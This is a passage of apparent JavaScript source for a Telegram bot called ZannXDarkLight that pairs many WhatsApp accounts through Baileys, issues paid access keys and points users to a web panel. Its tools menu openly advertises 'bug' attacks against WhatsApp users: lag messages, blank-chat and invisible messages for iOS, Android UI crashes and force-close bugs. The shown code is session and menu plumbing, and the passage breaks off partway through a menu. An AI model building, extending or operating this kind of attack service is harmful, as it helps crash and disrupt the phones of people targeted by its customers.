const { Telegraf, Markup } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const express = require('express');
const fetch = require("node-fetch");
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const { spawn } = require('child_process');
const {
  default: makeWASocket,
  makeCacheableSignalKeyStore,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  fetchLatestWaWebVersion,
  generateForwardMessageContent,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  generateMessageTag,
  generateMessageID,
  downloadContentFromMessage,
  makeInMemoryStore,
  getContentType,
  jidDecode,
  MessageRetryMap,
  getAggregateVotesInPollMessage,
  proto,
  delay
} = require("@whiskeysockets/baileys");

const { tokens, owners: ownerIds, ipvps: VPS, port: PORT } = config;
const bot = new Telegraf(tokens);
const cors = require("cors");
const app = express();
const activeSessions = new Map();

app.use(cors());

const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./database/akses.json";
const userPath = path.join(__dirname, "./database/user.json");
const userSessionsPath = path.join(__dirname, "user_sessions.json");
const userEvents = new Map();
let userApiBug = null;
let sock;

const phoneHelper = require('./phone-helper.js');
const { 
    cleanPhoneNumber, 
    isValidPhoneNumber, 
    getCountryFromNumber 
} = phoneHelper;

function loadAkses() {
  if (!fs.existsSync(file)) {
    const initData = {
      owners: [],
      vips: [],
      akses: []
    };
    fs.writeFileSync(file, JSON.stringify(initData, null, 2));
    return initData;
  }

  let data = JSON.parse(fs.readFileSync(file));
  
  if (!data.vips) data.vips = [];
  if (!data.akses) data.akses = [];
  
  delete data.resellers;
  delete data.pts;
  delete data.moderators;

  return data;
}

function initializeOwners() {
  const aksesData = loadAkses();
  const configOwners = config.owners || [];
  let updated = false;

  configOwners.forEach(ownerId => {
    if (!aksesData.owners.includes(ownerId.toString())) {
      aksesData.owners.push(ownerId.toString());
      updated = true;
      console.log(`✅ Auto-registered owner from config: ${ownerId}`);
    }
  });

  if (updated) {
    saveAkses(aksesData);
    console.log('📁 Updated akses.json with owners from config.js');
  }
}

function generateSessionId() {
  return crypto.randomBytes(16).toString('hex');
}

function cleanupStaleSessions() {
  const now = Date.now();
  const twentyFourHours = 24 * 60 * 60 * 1000;
  
  for (const [username, session] of activeSessions.entries()) {
    if (now - session.loginTime > twentyFourHours) {
      activeSessions.delete(username);
      console.log(`🧹 Cleaned up stale session (24h) for: ${username}`);
    }
  }
}

setInterval(cleanupStaleSessions, 60 * 60 * 1000);

function refreshSession(req, res, next) {
  const username = req.cookies.sessionUser;
  const clientSessionId = req.cookies.sessionId;
  
  if (username && clientSessionId) {
    const activeSession = activeSessions.get(username);
    if (activeSession && activeSession.sessionId === clientSessionId) {
      activeSession.loginTime = Date.now();
    }
  }
  
  next();
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function isOwner(id) {
  const configOwners = config.owners || [];
  return configOwners.includes(id.toString());
}

function isVip(id) {
  const data = loadAkses();
  return data.vips.includes(id.toString());
}

function isAuthorized(id) {
  const data = loadAkses();
  return (
    isOwner(id) ||
    data.vips.includes(id.toString()) || 
    data.akses.includes(id.toString())
  );
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

function sessionPath(BotNumber) {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
}

function saveUsers(users) {
  const filePath = path.join(__dirname, "database", "user.json");
  try {
    fs.writeFileSync(filePath, JSON.stringify(users, null, 2), "utf-8");
    console.log("✓ Data user berhasil disimpan.");
  } catch (err) {
    console.error("✗ Gagal menyimpan user:", err);
  }
}

function getUsers() {
  const filePath = path.join(__dirname, "database", "user.json");
  if (!fs.existsSync(filePath)) return [];
  try {
    return JSON.parse(fs.readFileSync(filePath, "utf-8"));
  } catch (err) {
    console.error("✗ Gagal membaca file user.json:", err);
    return [];
  }
}

function loadUserSessions() {
  if (!fs.existsSync(userSessionsPath)) {
    console.log(`[SESSION] 📂 Creating new user_sessions.json`);
    const initialData = {};
    fs.writeFileSync(userSessionsPath, JSON.stringify(initialData, null, 2));
    return initialData;
  }
  
  try {
    const data = JSON.parse(fs.readFileSync(userSessionsPath, "utf8"));
    return data;
  } catch (err) {
    console.error("[SESSION] ❌ Error loading user_sessions.json, resetting:", err);
    const initialData = {};
    fs.writeFileSync(userSessionsPath, JSON.stringify(initialData, null, 2));
    return initialData;
  }
}

function saveUserSessions(data) {
  try {
    fs.writeFileSync(userSessionsPath, JSON.stringify(data, null, 2));
  } catch (err) {
    console.error("❌ Gagal menyimpan user_sessions.json:", err);
  }
}

const userSessionPath = (username, BotNumber) => {
  const userDir = path.join(sessions_dir, "users", username);
  const dir = path.join(userDir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

function sendEventToUser(username, eventData) {
  if (userEvents.has(username)) {
    const res = userEvents.get(username);
    try {
      res.write(`data: ${JSON.stringify(eventData)}\n\n`);
    } catch (err) {
      console.error(`[Events] Error sending to ${username}:`, err.message);
      userEvents.delete(username);
    }
  }
}

// ==================== AUTO RELOAD SESSIONS ==================== //
let reloadAttempts = 0;
const MAX_RELOAD_ATTEMPTS = 3;

function forceReloadWithRetry() {
  reloadAttempts++;
  console.log(`\n🔄 RELOAD ATTEMPT ${reloadAttempts}/${MAX_RELOAD_ATTEMPTS}`);
  
  const userSessions = loadUserSessions();
  
  if (Object.keys(userSessions).length === 0) {
    console.log('💡 No sessions to reload - waiting for users to add senders');
    return;
  }
  
  console.log(`📋 Found ${Object.keys(userSessions).length} users with sessions`);
  simpleReloadSessions();
  
  setTimeout(() => {
    const activeSessionCount = sessions.size;
    console.log(`📊 Current active sessions: ${activeSessionCount}`);
    
    if (activeSessionCount === 0 && reloadAttempts < MAX_RELOAD_ATTEMPTS) {
      console.log(`🔄 No active sessions, retrying... (${reloadAttempts}/${MAX_RELOAD_ATTEMPTS})`);
      forceReloadWithRetry();
    } else if (activeSessionCount === 0) {
      console.log('❌ All reload attempts failed - manual reconnection required');
    } else {
      console.log(`✅ SUCCESS: ${activeSessionCount} sessions active`);
      reloadAttempts = 0; 
    }
  }, 30000);
}

function simpleReloadSessions() {
  console.log('=== 🔄 SESSION RELOAD STARTED ===');
  const userSessions = loadUserSessions();
  
  if (Object.keys(userSessions).length === 0) {
    console.log('💡 No user sessions found');
    return;
  }

  let totalProcessed = 0;
  let successCount = 0;
  let staffSessions = 0;

  for (const [username, numbers] of Object.entries(userSessions)) {
    console.log(`👤 Processing: ${username} with ${numbers.length} senders`);
    
    const isStaffSession = username.startsWith('staff_');
    
    numbers.forEach(number => {
      totalProcessed++;
      if (isStaffSession) staffSessions++;
      
      const sessionDir = userSessionPath(username, number);
      const credsPath = path.join(sessionDir, 'creds.json');
      
      if (fs.existsSync(credsPath)) {
        console.log(`🔄 Attempting to reconnect: ${number} for ${username}`);
        
        if (isStaffSession) {
          reconnectStaffBackground(username, number, sessionDir)
            .then(() => {
              successCount++;
              console.log(`✅ Staff reconnected: ${number}`);
            })
            .catch(err => {
              console.log(`❌ Failed to reconnect staff ${number}: ${err.message}`);
            });
        } else {
          connectToWhatsAppUser(username, number, sessionDir)
            .then(() => {
              successCount++;
              console.log(`✅ User reconnected: ${number}`);
            })
            .catch(err => {
              console.log(`❌ Failed to reconnect user ${number}: ${err.message}`);
            });
        }
      } else {
        console.log(`⚠️ No session files for ${number}, skipping`);
      }
    });
  }
  
  console.log(`📊 Reload summary: ${successCount}/${totalProcessed} sessions`);
  console.log(`👔 Staff sessions: ${staffSessions}`);
}

// ==================== AUTO RECONNECT USER SESSIONS ==================== //
function autoReconnectUserSessions() {
  console.log('🔄 AUTO RECONNECT: Checking user sessions...');
  const userSessions = loadUserSessions();
  
  let totalAttempts = 0;
  let successCount = 0;
  
  for (const [username, numbers] of Object.entries(userSessions)) {
    console.log(`👤 Auto-reconnecting user: ${username} (${numbers.length} senders)`);
    
    numbers.forEach(number => {
      totalAttempts++;
      
      if (sessions.has(number)) {
        console.log(`✅ ${number} already connected, skipping`);
        return;
      }
      
      const sessionDir = userSessionPath(username, number);
      const credsPath = path.join(sessionDir, 'creds.json');
      
      if (!fs.existsSync(credsPath)) {
        console.log(`⚠️ No session found for ${number}, user needs to pair again`);
        return;
      }
      
      console.log(`🔄 Auto-reconnecting ${number} for ${username}`);
      
      connectToWhatsAppUser(username, number, sessionDir)
        .then(sock => {
          successCount++;
          console.log(`✅ Auto-reconnect SUCCESS: ${number} for ${username}`);
          
          sendEventToUser(username, {
            type: 'success',
            message: `Sender ${number} berhasil di-reconnect otomatis`,
            number: number,
            status: 'reconnected'
          });
        })
        .catch(err => {
          console.log(`❌ Auto-reconnect FAILED for ${number}: ${err.message}`);
          
          sendEventToUser(username, {
            type: 'warning',
            message: `Sender ${number} gagal reconnect: ${err.message}`,
            number: number,
            status: 'disconnected'
          });
        });
    });
  }
  
  console.log(`📊 Auto-reconnect summary: ${successCount}/${totalAttempts} sessions`);
}

const connectToWhatsAppUser = async (username, BotNumber, sessionDir) => {
  try {
    console.log(`[${username}] 🚀 Starting WhatsApp connection for ${BotNumber}`);
    
    sendEventToUser(username, {
      type: 'status',
      message: 'Memulai koneksi WhatsApp...',
      number: BotNumber,
      status: 'connecting'
    });

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestWaWebVersion();

    const userSock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: 60000,
      connectTimeoutMs: 60000,
      keepAliveIntervalMs: 10000,
      generateHighQualityLinkPreview: true,
      syncFullHistory: false
    });

    return new Promise((resolve, reject) => {
      let isConnected = false;
      let pairingCodeGenerated = false;
      let connectionTimeout;

      const cleanup = () => {
        if (connectionTimeout) clearTimeout(connectionTimeout);
      };

      userSock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        console.log(`[${username}] 🔄 Connection update:`, connection);

        if (connection === "close") {
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          console.log(`[${username}] ❌ Connection closed with status:`, statusCode);

          sessions.delete(BotNumber);
          console.log(`[${username}] 🗑️ Removed ${BotNumber} from sessions map`);

          if (statusCode === DisconnectReason.loggedOut) {
            console.log(`[${username}] 📵 Device logged out, cleaning session...`);
            sendEventToUser(username, {
              type: 'error',
              message: 'Device logged out, silakan scan ulang',
              number: BotNumber,
              status: 'logged_out'
            });
            
            if (fs.existsSync(sessionDir)) {
              fs.rmSync(sessionDir, { recursive: true, force: true });
            }
            cleanup();
            reject(new Error("Device logged out, please pairing again"));
            return;
          }

          if (statusCode === DisconnectReason.restartRequired || 
              statusCode === DisconnectReason.timedOut) {
            console.log(`[${username}] 🔄 Reconnecting...`);
            sendEventToUser(username, {
              type: 'status',
              message: 'Mencoba menyambung kembali...',
              number: BotNumber,
              status: 'reconnecting'
            });
            
            setTimeout(async () => {
              try {
                const newSock = await connectToWhatsAppUser(username, BotNumber, sessionDir);
                resolve(newSock);
              } catch (error) {
                reject(error);
              }
            }, 5000);
            return;
          }

          if (!isConnected) {
            cleanup();
            sendEventToUser(username, {
              type: 'error',
              message: `Koneksi gagal dengan status: ${statusCode}`,
              number: BotNumber,
              status: 'failed'
            });
            reject(new Error(`Connection failed with status: ${statusCode}`));
          }
        }

        if (connection === "open") {
          console.log(`[${username}] ✅ CONNECTED SUCCESSFULLY!`);
          isConnected = true;
          cleanup();
          
          sessions.set(BotNumber, userSock);
          
          sendEventToUser(username, {
            type: 'success',
            message: 'Berhasil terhubung dengan WhatsApp!',
            number: BotNumber,
            status: 'connected'
          });
          
          const userSessions = loadUserSessions();
          if (!userSessions[username]) {
            userSessions[username] = [];
          }
          if (!userSessions[username].includes(BotNumber)) {
            userSessions[username].push(BotNumber);
            saveUserSessions(userSessions);
            console.log(`[${username}] 💾 Session saved for ${BotNumber}`);
          }
          
          resolve(userSock);
        }

        if (connection === "connecting") {
          console.log(`[${username}] 🔄 Connecting to WhatsApp...`);
          sendEventToUser(username, {
            type: 'status',
            message: 'Menghubungkan ke WhatsApp...',
            number: BotNumber,
            status: 'connecting'
          });
          
          if (!fs.existsSync(`${sessionDir}/creds.json`) && !pairingCodeGenerated) {
            pairingCodeGenerated = true;
            
            setTimeout(async () => {
              try {
                console.log(`[${username}] 📞 Requesting pairing code for ${BotNumber}...`);
                sendEventToUser(username, {
                  type: 'status',
                  message: 'Meminta kode pairing...',
                  number: BotNumber,
                  status: 'requesting_code'
                });
                
                const code = await userSock.requestPairingCode(BotNumber);
                const formattedCode = code.match(/.{1,4}/g)?.join('-') || code;
                
                console.log(`╔═══════════════════════════════════╗`);
                console.log(`║  📱 PAIRING CODE - ${username}`);
                console.log(`╠═══════════════════════════════════╣`);
                console.log(`║  Nomor Sender : ${BotNumber}`);
                console.log(`║  Kode Pairing : ${formattedCode}`);
                console.log(`╚═══════════════════════════════════╝`);
                
                sendEventToUser(username, {
                  type: 'pairing_code',
                  message: 'Kode Pairing Berhasil Digenerate!',
                  number: BotNumber,
                  code: formattedCode,
                  status: 'waiting_pairing',
                  instructions: [
                    '1. Buka WhatsApp di HP Anda',
                    '2. Tap ⋮ (titik tiga) > Linked Devices > Link a Device',
                    '3. Masukkan kode pairing berikut:',
                    `KODE: ${formattedCode}`,
                    '4. Kode berlaku 30 detik!'
                  ]
                });
                
              } catch (err) {
                console.error(`[${username}] ❌ Error requesting pairing code:`, err.message);
                sendEventToUser(username, {
                  type: 'error',
                  message: `Gagal meminta kode pairing: ${err.message}`,
                  number: BotNumber,
                  status: 'code_error'
                });
              }
            }, 3000);
          }
        }

        if (qr) {
          console.log(`[${username}] 📋 QR Code received`);
          sendEventToUser(username, {
            type: 'qr',
            message: 'Scan QR Code berikut:',
            number: BotNumber,
            qr: qr,
            status: 'waiting_qr'
          });
        }
      });

      userSock.ev.on("creds.update", saveCreds);
      
      connectionTimeout = setTimeout(() => {
        if (!isConnected) {
          sendEventToUser(username, {
            type: 'error', 
            message: 'Timeout - Tidak bisa menyelesaikan koneksi dalam 120 detik',
            number: BotNumber,
            status: 'timeout'
          });
          cleanup();
          reject(new Error("Connection timeout - tidak bisa menyelesaikan koneksi"));
        }
      }, 120000);
    });
  } catch (error) {
    console.error(`[${username}] ❌ Error in connectToWhatsAppUser:`, error);
    sendEventToUser(username, {
      type: 'error',
      message: `Error: ${error.message}`,
      number: BotNumber,
      status: 'error'
    });
    throw error;
  }
};

// ==================== CONNECT FOR STAFF (TELEGRAM) ==================== //
const connectToWhatsAppStaff = async (ctx, number) => {
  try {
    console.log(`[STAFF] 🚀 Starting WhatsApp connection for ${number}`);
    
    const username = `staff_${ctx.from.id}`;
    const sessionDir = userSessionPath(username, number);
    
    await ctx.reply(`🔄 *Connecting ${number} as staff sender...*`, { parse_mode: "Markdown" });
    
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestWaWebVersion();

    const staffSock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: 60000,
      connectTimeoutMs: 60000,
      keepAliveIntervalMs: 10000,
      generateHighQualityLinkPreview: true,
      syncFullHistory: false
    });

    return new Promise((resolve, reject) => {
      let isConnected = false;
      let pairingCodeGenerated = false;
      let connectionTimeout;

      const cleanup = () => {
        if (connectionTimeout) clearTimeout(connectionTimeout);
      };

      staffSock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        console.log(`[STAFF] 🔄 Connection update:`, connection);

        if (connection === "close") {
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          console.log(`[STAFF] ❌ Connection closed with status:`, statusCode);

          sessions.delete(number);

          if (statusCode === DisconnectReason.loggedOut) {
            console.log(`[STAFF] 📵 Device logged out, cleaning session...`);
            await ctx.reply(`❌ Device logged out, please pair again: ${number}`);
            
            if (fs.existsSync(sessionDir)) {
              fs.rmSync(sessionDir, { recursive: true, force: true });
            }
            cleanup();
            reject(new Error("Device logged out"));
            return;
          }

          if (statusCode === DisconnectReason.restartRequired || 
              statusCode === DisconnectReason.timedOut) {
            console.log(`[STAFF] 🔄 Reconnecting...`);
            await ctx.reply(`⚠️ Reconnecting ${number}...`);
            
            setTimeout(async () => {
              try {
                const newSock = await connectToWhatsAppStaff(ctx, number);
                resolve(newSock);
              } catch (error) {
                reject(error);
              }
            }, 5000);
            return;
          }

          if (!isConnected) {
            cleanup();
            await ctx.reply(`❌ Connection failed for ${number}: Status ${statusCode}`);
            reject(new Error(`Connection failed with status: ${statusCode}`));
          }
        }

        if (connection === "open") {
          console.log(`[STAFF] ✅ CONNECTED SUCCESSFULLY!`);
          isConnected = true;
          cleanup();
          
          sessions.set(number, staffSock);
          
          const userSessions = loadUserSessions();
          if (!userSessions[username]) {
            userSessions[username] = [];
          }
          if (!userSessions[username].includes(number)) {
            userSessions[username].push(number);
            saveUserSessions(userSessions);
            console.log(`[STAFF] 💾 Session saved for ${number}`);
          }
          
          await ctx.reply(`✅ *SUCCESS!* Sender ${number} connected as staff.`, { parse_mode: "Markdown" });
          resolve(staffSock);
        }

        if (connection === "connecting") {
          await ctx.reply(`🔄 Connecting to WhatsApp for ${number}...`);
          
          if (!fs.existsSync(`${sessionDir}/creds.json`) && !pairingCodeGenerated) {
            pairingCodeGenerated = true;
            
            setTimeout(async () => {
              try {
                console.log(`[STAFF] 📞 Requesting pairing code for ${number}...`);
                await ctx.reply(`📱 *Requesting pairing code...*`, { parse_mode: "Markdown" });
                
                const code = await staffSock.requestPairingCode(number);
                const formattedCode = code.match(/.{1,4}/g)?.join('-') || code;
                
                const message = `
🔐 *PAIRING CODE - STAFF*

📱 *Sender:* ${number}
🔢 *Code:* \`${formattedCode}\`

*Instructions:*
1. Open WhatsApp on your phone
2. Tap ⋮ (three dots) > Linked Devices > Link a Device  
3. Enter this pairing code:
   \`\`\`
   ${formattedCode}
   \`\`\`
4. Code valid for 30 seconds!

_This code will also be saved for auto-reconnect._
                `;
                
                await ctx.reply(message, { parse_mode: "Markdown" });
                
                console.log(`╔═══════════════════════════════════╗`);
                console.log(`║  📱 STAFF PAIRING CODE            ║`);
                console.log(`╠═══════════════════════════════════╣`);
                console.log(`║  Sender : ${number}               ║`);
                console.log(`║  Code   : ${formattedCode}        ║`);
                console.log(`╚═══════════════════════════════════╝`);
                
              } catch (err) {
                console.error(`[STAFF] ❌ Error requesting pairing code:`, err.message);
                await ctx.reply(`❌ Error getting pairing code: ${err.message}`);
              }
            }, 3000);
          }
        }

        if (qr) {
          console.log(`[STAFF] 📋 QR Code received`);
          await ctx.reply(`📱 *QR Code Received*\nPlease use pairing code instead.`, { parse_mode: "Markdown" });
        }
      });

      staffSock.ev.on("creds.update", saveCreds);
      
      connectionTimeout = setTimeout(() => {
        if (!isConnected) {
          ctx.reply(`⏰ *Timeout* - Could not complete connection in 120 seconds`, { parse_mode: "Markdown" });
          cleanup();
          reject(new Error("Connection timeout"));
        }
      }, 120000);
    });
  } catch (error) {
    console.error(`[STAFF] ❌ Error in connectToWhatsAppStaff:`, error);
    await ctx.reply(`❌ Connection error: ${error.message}`);
    throw error;
  }
};

// ==================== AUTO-RECONNECT FOR STAFF (BACKGROUND) ==================== //
async function reconnectStaffBackground(staffUsername, number, sessionDir) {
  try {
    console.log(`[STAFF-AUTO] 🔄 Reconnecting staff sender: ${number}`);
    
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestWaWebVersion();

    const staffSock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: 60000,
      connectTimeoutMs: 60000,
      keepAliveIntervalMs: 10000,
      generateHighQualityLinkPreview: true,
      syncFullHistory: false
    });

    return new Promise((resolve, reject) => {
      let isConnected = false;
      let connectionTimeout;

      staffSock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;
        
        if (connection === "close") {
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          console.log(`[STAFF-AUTO] ❌ ${number} disconnected:`, statusCode);

          sessions.delete(number);

          if (statusCode === DisconnectReason.loggedOut) {
            console.log(`[STAFF-AUTO] 📵 ${number} logged out`);
            if (fs.existsSync(sessionDir)) {
              fs.rmSync(sessionDir, { recursive: true, force: true });
            }
            reject(new Error("Device logged out"));
            return;
          }

          setTimeout(async () => {
            try {
              await reconnectStaffBackground(staffUsername, number, sessionDir);
              resolve();
            } catch (error) {
              reject(error);
            }
          }, 10000);
        }

        if (connection === "open") {
          console.log(`[STAFF-AUTO] ✅ ${number} reconnected!`);
          isConnected = true;
          
          sessions.set(number, staffSock);
          resolve();
        }
      });

      staffSock.ev.on("creds.update", saveCreds);
      
      connectionTimeout = setTimeout(() => {
        if (!isConnected) {
          reject(new Error("Staff reconnect timeout"));
        }
      }, 60000);
    });
  } catch (error) {
    console.error(`[STAFF-AUTO] ❌ Error:`, error.message);
    throw error;
  }
}

bot.command("start", async (ctx) => {
  const username = ctx.from.username || ctx.from.first_name || "User";
  
  const teks = `
<blockquote>🍁 ZannXDarkLight V1 Pro+</blockquote>
<i>Advanced WhatsApp Management System</i>

<blockquote>「 Information 」</blockquote>
<b>Developer : @ZanXtzymods</b>
<b>Version   : 4 ⧸ <code>Pro+</code></b>
<b>Username  : ${username}</b>

<i>Pilih menu di bawah untuk mengakses fitur bot:</i>
`;

  const keyboard = Markup.inlineKeyboard([
    // Baris 1 - Menu Utama
    [
      Markup.button.callback("🔑 Create Menu", "show_create_menu"),
      Markup.button.callback("🔐 Access Menu", "show_access_menu")
    ],
    // Baris 2 - Menu Admin
    [
      Markup.button.callback("👑 Owner Menu", "show_owner_menu"),
      Markup.button.callback("👥 Sender Menu", "show_sender_menu")
    ],
    // Baris 3 - Fitur Utama
    [
      Markup.button.callback("⚡ Tools", "show_tools_menu"),
      Markup.button.callback("🛠️ Utilities", "show_utils_menu")
    ],
    // Baris 4 - Informasi
    [
      Markup.button.callback("ℹ️ Bot Info", "show_bot_info"),
      Markup.button.callback("🌐 Web Panel", "show_web_panel")
    ],
    // Baris 5 - Support
    [
      Markup.button.url("💬 Chat Dev", "https://t.me/zanxtzyzofficialmods"),
      Markup.button.url("📢 Channel", "https://t.me/zanxtzyzofficialmods")
    ]
  ]);

  await ctx.reply(teks, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
});

// ==================== CREATE MENU ==================== //
bot.action("show_create_menu", async (ctx) => {
  const createMenu = `
<blockquote>🔑 CREATE MENU</blockquote>
<b>Perintah baru:</b>

/addkey <b>nama_user,hari_expired,id_telegram</b>

<b>Contoh:</b>
/addkey <i>zansigma,7,123456789</i>
/addkey <i>zansukaneko,30,987654321</i>

<b>Fitur:</b>
• Auto kirim ke user via Telegram
• Validasi user sudah /start bot
`;

  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback("🔙 Back", "back_to_main"),
      Markup.button.callback("🔐 Access Menu", "show_access_menu")
    ]
  ]);

  await ctx.editMessageText(createMenu, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

// ==================== ACCESS MENU ==================== //
bot.action("show_access_menu", async (ctx) => {
  const accessMenu = `
<blockquote>🔐 ACCESS CONTROL</blockquote>
<i>Manajemen akses pengguna</i>

<b>Perintah untuk Owner/VIP:</b>

• /addkey <b>nama_user,hari_expired,id_telegram</b>
  <b>Role:</b> USER, VIP
  <b>Contoh:</b>
  - /addkey <i>zansigma,7,123456789</i>
  - /addkey <i>zansukaneko,30,987654321</i>

• <b>/listkey</b>
  Lihat semua key yang aktif

• /delkey <i>username</i>
  Hapus key user

<b>Level Akses:</b>
• <b>Owner</b> - Full access
• <b>VIP</b> - Access semua sender
• <b>User</b> - Hanya sender sendiri
`;

  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback("🔙 Back", "back_to_main"),
      Markup.button.callback("🔑 Create Menu", "show_create_menu")
    ]
  ]);

  await ctx.editMessageText(accessMenu, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

// ==================== OWNER MENU ==================== //
bot.action("show_owner_menu", async (ctx) => {
  const ownerMenu = `
<blockquote>👑 OWNER COMMANDS</blockquote>
<i>Perintah khusus untuk Owner bot</i>

<b>Management Sender:</b>
• /connect <i>number</i>
  Tambah sender WhatsApp staff
  Contoh: /connect <code>628123456789</code>

• <b>/staffsenders</b>
  Lihat semua staff sender yang aktif

• <b>/reconnectstaff</b> <i>number</i>
  Reconnect staff sender
  Contoh: <b>/reconnectstaff</b> <code>628123456789</code>

<b>User Management:</b>
• /addkey <i>role,username,durasi</i>
  Buat key untuk user/vip

• <b>/listkey</b>
  Lihat semua key

• <b>/delkey</b> <i>username</i>
  Hapus key user
`;

  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback("🔙 Back", "back_to_main"),
      Markup.button.callback("👥 Sender Menu", "show_sender_menu")
    ]
  ]);

  await ctx.editMessageText(ownerMenu, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

// ==================== SENDER MENU ==================== //
bot.action("show_sender_menu", async (ctx) => {
  const senderMenu = `
<blockquote>👥 SENDER MANAGEMENT</blockquote>
<i>Kelola sender WhatsApp</i>

<b>Untuk Owner:</b>
• <code>/connect number</code>
  Tambah sender baru
  Contoh: /connect <code>628123456789</code>

• <b>/staffsenders</b>
  List semua staff sender

• <b>/reconnectstaff</b> <i>number</i>
  Reconnect sender yang offline

<b>Untuk User (Web Panel):</b>
1. Login ke web panel
2. Buka menu "My Senders"
3. Tambah sender dengan nomor WhatsApp
4. Pairing code

<b>Note:</b> User regular hanya bisa manage sender sendiri.
`;

  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback("🔙 Back", "back_to_main"),
      Markup.button.callback("👑 Owner Menu", "show_owner_menu")
    ]
  ]);

  await ctx.editMessageText(senderMenu, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

// ==================== TOOLS MENU ==================== //
bot.action("show_tools_menu", async (ctx) => {
  const toolsMenu = `
<blockquote>⚡ BUG & TOOLS</blockquote>
<i>Fitur eksekusi dan tools</i>

<b>Web Panel Tools:</b>
• Akses via: <code>https://panel-private.dray1.store</code>
• Login dengan username & key

<b>Bug Types:</b>
1. <b>Delay Protocol</b> - Lag bug
2. <b>blankios iOS</b> - Blank chat iOS
3. <b>Android X-02N7 Ui</b> - Android bug
4. <b>Force Close EexterNal</b> - Force close
5. <b>InVisble iOS</b> - Invisible message

<b>Command Line:</b>
• <b>/help</b> - Melihat info lainnya
`;

  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback("🔙 Back", "back_to_main"),
      Markup.button.callback("🛠️ Utilities", "show_utils_menu")
    ]
  ]);

  await ctx.editMessageText(toolsMenu, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

// ==================== UTILITIES MENU ==================== //
bot.action("show_utils_menu", async (ctx) => {
  const utilsMenu = `
<blockquote>🛠️ UTILITIES</blockquote>
<i>Fitur utilitas tambahan</i>

<b>Available Utilities:</b>

• <b>Auto-reconnect</b>
  - Sistem auto reconnect otomatis
  - Cek setiap 30 detik
  - Support staff & user sessions

• <b>Session Management</b>
  - Multi-file auth state
  - Auto save session
  - Backup credentials

• <b>Health Check</b>
  - Monitor active sessions
  - Auto reload jika mati
  - Status reporting

• <b>Web Interface</b>
  - Dashboard user-friendly
  - Real-time events (SSE)
  - Sender management
`;

  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback("🔙 Back", "back_to_main"),
      Markup.button.callback("⚡ Tools", "show_tools_menu")
    ]
  ]);

  await ctx.editMessageText(utilsMenu, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

// ==================== BOT INFO ==================== //
bot.action("show_bot_info", async (ctx) => {
  const infoText = `
<blockquote>🤖 BOT INFORMATION</blockquote>

<b>ZanXDarkLight V1 Pro+</b>
<i>Advanced WhatsApp Management System</i>

<b>🔧 Features:</b>
• Multi-session WhatsApp
• User Management System
• Role-based Access Control
• Auto-reconnect System
• Web Dashboard Interface
• Real-time Events
• Bug Execution Tools
• Session Persistence

<b>📊 System Info:</b>
• Version: 1.0 (Pro+)
• Developer: @ZanXtzyMods
• Framework: Telegraf + Baileys
• Storage: JSON-based
• Sessions: Multi-file auth

<b>🛡️ Security:</b>
• Session validation
• 24h session expiry
• Role-based permissions

<b>📞 Support:</b>
Contact @ZanXtzyMods for assistance
`;

  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback("🔙 Back", "back_to_main")]
  ]);

  await ctx.editMessageText(infoText, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

// ==================== WEB PANEL INFO ==================== //
bot.action("show_web_panel", async (ctx) => {
  const webPanel = `
<blockquote>🌐 WEB INTERFACE</blockquote>

<b>Fitur Web Panel:</b>

1. <b>Dashboard User</b>
